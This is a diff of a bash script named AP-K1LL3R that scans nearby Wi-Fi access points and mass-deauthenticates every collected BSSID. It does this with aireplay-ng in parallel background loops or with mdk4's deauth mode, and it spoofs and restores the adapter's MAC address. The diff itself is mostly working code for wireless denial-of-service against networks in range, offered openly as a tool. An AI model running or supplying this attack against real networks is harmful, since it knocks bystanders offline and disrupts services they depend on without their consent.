@@ -14,8 +14,14 @@ function pause {
 	read -p "$*"
 	}
 
+function trap_ctrlc ()
+{
+	echo "${RED}[!] ${YELLOW}Stopping kill mode.."
+	exit 2
+}
+
 clear
-rm *.txt
+rm *.txt 2>/dev/null
 echo -e $BOLD"${CYAN}"
 figlet AP-K1LL3R
 sleep 1
@@ -24,11 +30,10 @@ echo -e "${RED}[!] Important: ${MAGENTA}All errors will saved in ${RED}$path/err
 ${MAGENTA}If you have any unexpected error, report it to my github:
 
 ${YELLOW}https://github.com/ViperZCrew/ap_killer
-${RED}Version: v0.4
+${RED}Version: v0.3
 ${MAGENTA}Creator: MrBlackX
 ${BLUE}Telegram: t.me/rebl0x3r
 "
-rm *.txt
 echo -e "${GREEN}Starting script now..."
 sleep 1
 read -p "Press [Enter] to continue, press after 10 seconds CTRL+C. "
@@ -74,7 +79,7 @@ then
 	count=$(wc -l $path/endresult.txt | cut -d\  -f1)
 	sleep 1
 	echo -e "${BLUE}[*] ${YELLOW}I have collected ${GREEN}$count ${YELLOW}available BSSIDs."
-	echo -ne  "${BLUE}[*] ${YELLOW}How many times do you want to deauth wifi(default:10): "
+	echo -ne "${BLUE}[*] ${YELLOW}How many times do you want to deauth wifi(default:10): "
 	read count
 	echo -e  "${BLUE}[*] ${YELLOW}Selected ${RED}$count ${YELLOW}will starting in few seconds..."
 	sleep 0.5
@@ -84,26 +89,33 @@ then
 	then
 		echo -e "${BLUE}[*] ${YELLOW}Trying to attack with aireplay...."
 		sleep 1
-		while read -r line; do aireplay-ng --deauth $count -a $line --ignore-negative-one $c; done < endresult.txt
+		echo -e $RED""
+		while read -r line
+		do 
+			aireplay-ng --deauth $count -a $line --ignore-negative-one $c&
+		done < endresult.txt 
+		echo -e $BLUE""
 		pause 'Press Enter to exit'
-		rm *.txt	
+		echo -e $RED""
+		rm *.txt
 	else
 		echo -e "${BLUE}[*] ${YELLOW}Trying to use MDK4 method..."
 		sleep 1
-		mdk4 $c d -w $path/endresult.txt -x 10 -c h
-		pause 'Press Enter to exit'
-		rm *.txt
+		echo -e $RED""
+		mdk4 $c d -w $path/endresult.txt -c h&
+		echo -e $BLUE""
+		pause 'Press [Enter] to exit' 
 	fi
 else
 	sleep 0.5
 	echo -e "${RED}[!] ${MAGENTA}Leaving..."
-	echo -e "${BLUE}[*] ${YELLOW}Disabling adapter mode.."
-	airmon-ng stop $c 2>$path/error.log
 	rm *.txt
 	echo -e "${BLUE}[*] ${YELLOW}Restoring original mac..."
-	n=$(ifconfig | grep wlan | awk '{print $1}' | tr -d :)
-	ifconfig $1 down
-	macchanger -p $1 2>$path/error.log
-	ifconfig $1 up
+	n=$(ifconfig | grep mon | awk '{print $1}' | tr -d :)
+	ifconfig $n down >/dev/null
+	macchanger -p $n >>/dev/null
+	ifconfig $n up >/dev/null
+	echo -e "${BLUE}[*] ${YELLOW}Disabling adapter mode.."
+	airmon-ng stop $1 2>$path/error.log
 	service network-manager restart
 fi
